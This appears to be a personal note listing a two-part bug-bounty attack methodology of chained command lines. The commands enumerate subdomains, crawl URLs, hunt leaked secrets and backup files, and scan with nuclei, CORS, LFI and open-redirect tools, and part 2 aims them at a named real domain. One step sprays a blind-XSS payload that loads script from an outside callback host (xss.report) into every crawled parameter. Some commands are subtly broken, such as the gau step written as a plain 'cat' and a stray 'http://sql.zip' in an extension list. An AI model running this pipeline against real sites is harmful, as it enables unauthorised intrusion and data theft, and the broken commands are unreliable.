1. [[Subfinder]]
	+ `subfinder -dL domains.txt -all -recursive -o subdomains.txt`
	+ [[Command Statement#Subfinder]]
2. [[CRT]] + [[JQ]] + [[Anew]] + [[Curl]]
	 + `%.domain.com`
	 + `curl -s https://crt.sh/\?q\=\example.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' | anew subdomains.txt`
	 + [[Command Statement#CRT]]
3. [[Cat]] + [[Httpx]]
	+ `httpx-toolkit -l subdomains.txt -ports 80,443,8000,8080,8888 -threads 100 > subdomains_alive.txt`
	+ [[Command Statement#Httpx]]
4. [[Katana]]
	+ `katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt`
	+ [[Command Statement#Katana]]
1. [[Naabu]]
	+ `naabu -list subdomains.txt -c 50 -nmap-cli '-sV -sC' -o naabu.txt`
	+ [[Command Statement#Naabu]]
2. [[Dirsearch]] + [[onelistforallshort]]
	+ `python3 /opt/dirsearch/dirsearch.py -l subdomains_alive.txt -x 400,404,429,500,502 -R 5 --random-agent -t 50 -F -o dirsearch.txt -w /opt/wordlist/oneListForall/onelistforallshort.txt`
	+ [[Command Statement#Dirsearch]]
3. [[GAU (GetAllUrls)]]
	+ `cat subdomains_alive.txt --subs --o gau.out`
	+ [[Command Statement#GAU]]
4. [[URO]]
	+ `cat gau.out | uro -o uro.out`
	+ [[Command Statement#URO_1]]
	+ `cat uro.out | grep ".js$" > js_files.out`
	+ `cat js_files.out | uro | anew js_files.out`
	+ [[Command Statement#URO_2]]
5. [[Secretfinder]]
	+ `cat js_files.out | while read url; do python3 /home/user/secretfinder.py -i $url -o cli >> secretfinder.out; done`
	+ [[Command Statement#Secretfinder]]
6. Sort

	```python
	with open('filter_param.txt', 'r') as file:
		lines = file.readlines()
	lines.sort()
	lines = lines[:100000]
	with open('sorted_param_100000.txt', 'w') as file:
		file.writelines(lines)
	```
	+ [[Command Statement#Sort]]

11. [[Nuclei]]
	+ `nuclei -list sorted_param_100000.txt -c 70 -rl 200 -fhr -lfa -t Custom-Nuclei-Templates -o nuclei_example.txt -es info`
	+ [[Command Statement#Nuclei]]
12. [[Shodan]]
	+ ssl:'example.com' 200

### Bug Hunting methodology part 2 by Lostsec :)

1. [[Subfinder]]
	+ `subfinder -d viator.com -all -recursive > subdomain.txt`

2. [[Cat]] + [[Httpx]]
	+ `cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt`
3. [[Katana]]
	+ `katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt`
4. [[Cat]] + [[Nuclei]]
	+ `cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"`
	+  `cat allurls.txt | grep -E "\.js$" >> js.txt`
	+ `cat js.txt | nuclei -t /home/bug/.local/nuclei-templates/http/exposures/`
5.  [[Echo]] + [[Katana]] + [[Grep]] + [[Nuclei]]
	+ `echo example.com | katana -ps | grep -E "\.js$" | nuclei -t /home/bug/.local/nuclei-templates/http/exposures/ -c 30`
6. [[Dirsearch]]
	+ `dirsearch -u http://example.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json`
7. [[Subfinder]] + [[Httpx]] + [[Katana]] + [[Bxss]]
	+ `subfinder -d example.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/rainer></script> -parameters`

8. [[Subzy]] 
	+ `subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl`
9. [[Corsy]]
	+ `python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"`
10. [[Nuclei]] 
	+ `nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors`
	+ `nuclei -list subdomains_alive.txt -tags cve,osint,tech`
11. [[Cat]]
	+ `cat allurls.txt | gf lfi | nuclei -tags lfi`
	+ `cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect`
#### siehe auch:
- [[LFI like Lostsec]]
- [[CORS Vulnerability like Lostsec]]
- [[Open Redirect like Lostsec]]
- [[Microsoft IIS Server Vulnerability like Lostsec]]












